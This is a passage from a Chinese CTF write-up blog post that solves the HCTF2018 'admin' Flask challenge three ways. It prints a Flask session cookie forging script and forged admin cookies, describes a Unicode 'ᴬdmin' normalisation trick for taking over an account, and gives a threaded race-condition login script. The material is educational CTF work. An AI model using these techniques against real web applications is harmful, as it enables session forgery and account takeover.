cookie  """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span><span class="params">(ABC)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></span><br><span class="line">            <span class="string">""" Encode a Flask session cookie """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(session_cookie_value, secret_key=None)</span>:</span></span><br><span class="line">            <span class="string">""" Decode a Flask cookie  """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">'Flask Session Cookie Decoder/Encoder'</span>,</span><br><span class="line">                epilog=<span class="string">"Author : Wilson Sumanang, Alexandre ZANNI"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(help=<span class="string">'sub-command help'</span>, dest=<span class="string">'subcommand'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">'encode'</span>, help=<span class="string">'encode'</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Secret key'</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-t'</span>, <span class="string">'--cookie-structure'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Session cookie structure'</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">'decode'</span>, help=<span class="string">'decode'</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Secret key'</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-c'</span>, <span class="string">'--cookie-value'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Session cookie value'</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">'encode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">'decode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure></p>
+<p>脚本有解密、加密两种功能，具体用法如下<br>解密:<code>python flask_session_manager.py decode -c -s  # -c是flask cookie里的session值 -s参数是SECRET_KEY</code><br>加密:<code>python flask_session_manager.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</code></p>
+<p>解密功能演示如下，把我们登录成功页面的cookie的session复制下来,<code>.eJw9kE-LwjAUxL_K8s4e0j_iInjYJVoqvISWtJJciltrmzRxoSp1K373zbrgbWDe-zEzd6iOQ3PuYHkZrs0MKn2A5R3evmAJiuZOmvWIorPosoiJUiMtezmlN2aYlVNBGE3nXKQToxlhpiAqKX7QbA2ag5GiM5y2AROSYIgB2xU3KbJIOtVh8qeLkdE6lqKeM7HVuFvHXFj_s_b83Miw1Mp01t8RpG0kd9nE6UZzWoQYMp9l2ythnRTpCh4zqM_Dsbp8983pVYFTjDHMPQZHaTZGJcrrT4eiHeXUEjS9r9WHPCktTm3g40bsY_XEabdvmxcpNxgfxn_ntHfeAKeHfW2bxeIdZnA9N8NzPAgIPH4BSzZuKg.XPPM0g.R-SQaZ-c92TXQB_37gFu8JabVUs</code>，然后放进脚本参数位置，如下图。<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\7.jpg" alt></p>
+<p>得到解密后的session格式如下<br><code>{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;d4fb1018e2d755b05dc2163ec54429923444654de222c27ca8c8855643c55e1a47bfa0e1a50478a7952b1a899c81164ccebf8ea54087ad381b8563cb02de9fa2&#39;, &#39;csrf_token&#39;: b&#39;8383dbf30b1cdfbf0f180c842975968ee3858874&#39;, &#39;image&#39;: b&#39;F38w&#39;, &#39;name&#39;: &#39;miracle778&#39;, &#39;user_id&#39;: &#39;10&#39;}</code></p>
+<p>把其中的name项的值改为admin后，再作为-t的参数进行session加密，如下图<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\8.jpg" alt></p>
+<p>得到签名后的admin session<br><code>.eJw9kE-LwjAQxb_KMmcP6R8vgoddoqXCJLSkleQiamubaeNCVepW_O6bdcHbgzfz4733gN1pqC8tLK7DrZ7BzlaweMDHARZgeO40rUZUbY8ui4QqLfKy01N6FyR6PRVM8HQuVToJnjFBBTNJ8YO0IaSKtGpJ8iYQSjMMMRDb4q5VFmlnWkz-dDEKfoy1Os6F2ljcrmKpev-z8vycdFhaQ23v7xjyJtLbbJJ8bSUvQgyFz7LpjOqdVukSnjM4XobT7vrd1ed3BckxxjD3GBw1rckkxusvh6oZ9dQwpM7X6kKZlD1OTeDjRuJz-cJZt2_qNyknjKvx3znvnTdgXzl7hhncLvXw2g0CBs9fJX1ssA.XPPSPQ.UZ-MG3ZUrN4nJzOXIsfjGdeiyLc</code></p>
+<p>用这个替换掉index页面的cookie值，即可成功伪造session，”变成admin”，得到flag<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\9.jpg" alt></p>
+<p>关于这个脚本，其实在运行的时候，我发现了点问题，就是当你解密的时候，要用到 -s -c两个参数，linux下，可以用<code>&#39;</code>或<code>&quot;</code>包围，而windows下只能用<code>&quot;</code>，否则会报错。然后加密的话，windows能够生成加密后的session，但是用它来替换掉index页面的session的话不起作用(亲测)，一开始我在windows下面试的，结果一致出不来flag，后面突然想到用linux试一下，才发现这个问题(2333)。然后每次加密生成的session是不一样的，猜测应该是里面加入了时间戳信息。</p>
+<p>然后其实加密的时候 -t参数没必要写这么长，我们可以看到index.html里代码是，只要<code>session[&#39;name&#39;]==admin</code>即可，所以我们可以用<br><code>python flask_session_manager.py encode -s &#39;ckj123&#39; -t &quot;{&#39;name&#39;:&#39;admin&#39;,&#39;user_id&#39;:&#39;10&#39;}&quot;</code><br>生成session，<code>eyJfZnJlc2giOmZhbHNlLCJuYW1lIjoiYWRtaW4iLCJ1c2VyX2lkIjoiMTAifQ.XPPVVw.PEoVwVpFka6CBxToJEUY2s7ydLE</code><br>也能得到flag。</p>
+<hr>
+<h1 id="解法二-——-Unicode欺骗"><a href="#解法二-——-Unicode欺骗" class="headerlink" title="解法二 —— Unicode欺骗"></a>解法二 —— Unicode欺骗</h1><p>这个解法好像才是这个题目想要考查的点，我们可以发现，不管是login、register还是change页面，只要是关于session[‘name’]的操作，都先用了strlower函数将name转成小写，但是python中有自带的转小写函数<code>lower</code>，这里重写了一个，可能有点猫腻，于是找到strlower函数的定义<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure></p>
+<p>这里用到了<code>nodeprep.prepare</code>函数，而nodeprep是从twisted模块中导入的<code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code>，在requirements.txt文件中，发现这里用到的twisted版本是<code>Twisted==10.2.0</code>，而官网最新版本为<code>19.2.0</code>(2019/6/2)，版本差距这么大，估计是存在什么漏洞，于是搜索一下<code>nodeprep.prepare</code>，找到一篇unicode安全的文章，<a href="https://paper.tuisec.win/detail/a9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a></p>
+<p>这里原理就是利用nodeprep.prepare函数会将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>在调用一次nodeprep.prepare函数会把<code>A</code>转换成<code>a</code>。<br>所以当我们用<code>ᴬdmin</code>注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成<code>Admin</code>，我们用<code>ᴬdmin</code>进行登录，可以看到index页面的username变成了<code>Admin</code>，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\11.jpg" alt><br>我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为<code>admin</code>，从而改掉<code>admin</code>的密码。<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\12.jpg" alt></p>
+<p>然后用<code>admin</code>和改的密码的登录，即可获取flag。<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\9.jpg" alt></p>
+<hr>
+<h1 id="解法三-——-条件竞争"><a href="#解法三-——-条件竞争" class="headerlink" title="解法三 —— 条件竞争"></a>解法三 —— 条件竞争</h1><p>仔细观察源码，可以发现login函数和change函数都在没有完全check身份的情况下，执行了session有关的赋值<br><img src="/CTF/HCTF2018/\HCTF2018-admin\\13.jpg" alt></p>
+<p>我们可以这样设想，一个进程以正常账号一直依次进行登录、改密码操作，另一个进程同时一直依次进行注销、以admin用户名加进程1更改的新密码进行登录。就有可能出现当进程1进行到改密码函数时，进程2进行到登录操作，这个时候进程1需要从session中取出name，而进程2此时把session[‘name’]改成了admin。</p>
+<p>所以就可以编写脚本进行条件竞争，条件竞争结束的标志为进程2登录操作成功，即重定向到<code>/index</code>。</p>
+<p>不过没有跑出来，可能是买的学生机性能不行，脚本跑的时候抛出拒绝连接、连接失败等异常。没跑出来，但是思路应该是正确的。下面就把代码贴下吧，这个代码也是参考来了，就那几步，可能代码也不行，导致没跑出来。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s,username,password)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>:username,</span><br><span class="line">        <span class="string">'password'</span>:password,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    r  = s.post(<span class="string">'http://13x.xx7.xx.xxx:9999/login'</span>,data=data)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(s)</span>:</span></span><br><span class="line">    s.get(<span class="string">'http://13x.xx7.xx.xxx:9999/logout'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_pwd</span><span class="params">(s,newpass)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'newpassword'</span>:newpass</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(<span class="string">'http://13x.xx7.xx.xxx:9999/change'</span>,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        login(s,<span class="string">'Miracle778'</span>,<span class="string">'Miracle778'</span>)</span><br><span class="line">        change_pwd(s,<span class="string">'Miracle778'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        logout(s)</span><br><span class="line">        r = login(s,<span class="string">'admin'</span>,<span class="string">'Miracle778'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;a href="/index"&gt;/index&lt;/a&gt;'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(r.text)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    t1 = threading.Thread(target=func1,args=(s,))</span><br><span class="line">    t2 = threading.Thread(target=func2,args=(s,))</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.start()</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题三种解法，学到东西挺多的，以后要多多复现经典题目2333~</p>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/164086#h3-13" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086#h3-13</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>ヾﾉ≧∀≦)o 来呀！快活呀！~</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById(&quot;QR&quot;); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="Miracle778 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Miracle778 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/HCTF2018/" rel="tag"><i class="fa fa-tag"></i> HCTF2018</a>
+          
+            <a href="/tags/CTF复现/" rel="tag"><i class="fa fa-tag"></i> CTF复现</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Web安全/SQL注入/SQL注入之布尔盲注.html" rel="next" title="SQL注入之布尔盲注">
+                <i class="fa fa-chevron-left"></i> SQL注入之布尔盲注
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  <div>
+    
+    <div>
+    
+    <div style="text-align:center;color: #000;font-size:17px; font-family:STLiti;">
+	-------- 本文结束 --------
+	</div>
+<div style="border: 1px solid black">
+<div style="margin-left:10px">
+<p style="font-size: 10px;line-height: 30px"><a href="https://miracle778.github.io" style="color:#258FC6">Miracle's Blog</a> by <a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a> is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">Creative Commons BY-NC-ND 4.0 International License</a>.
+<br>
+由<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a>创作并维护的<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778's Blog</a>博客采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">创作共用保留署名-非商业-禁止演绎4.0国际许可证</a>。<br>
+本文首发于<a href="https://miracle.github.io" style="color:#258FC6">Miracle's Blog</a> 博客（ <a href="https://miracle778.github.io" style="color:#258FC6">https://miracle778.github.io</a> ），版权所有，侵权必究。</p>
+</div>
+</div>
+    
+</div>
+
+    
+ </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/米兔.jpg" alt="Miracle778">
+            
+              <p class="site-author-name" itemprop="name">Miracle778</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">21</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">40</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Miracle778" title="GitHub &rarr; https://github.com/Miracle778" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:Yiitao@163.com" title="E-Mail &rarr; mailto:Yiitao@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+          
+          <br>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=29045579&auto=0&height=32"></iframe>
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#审题"><span class="nav-number">2.</span> <span class="nav-text">审题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解法一-——-flask-session-伪造"><span class="nav-number">3.</span> <span class="nav-text">解法一 —— flask session 伪造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解法二-——-Unicode欺骗"><span class="nav-number">4.</span> <span class="nav-text">解法二 —— Unicode欺骗</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解法三-——-条件竞争"><span class="nav-number">5.</span> <span class="nav-text">解法三 —— 条件竞争</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#小结"><span class="nav-number">6.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Miracle778</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">234k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">3:33</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'w9nX4X8WpdsRFrCFoTt7cpqz-gzGzoHsz',
+    appKey: 'H3aV3vWVqkmAgeD0ep6RVf07',
+    placeholder: 'ヾﾉ≧∀≦)o 来呀！快活呀！~',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn'
+  });
+</script>
+
+
+
+
+  
+
+
+  
+  <script>
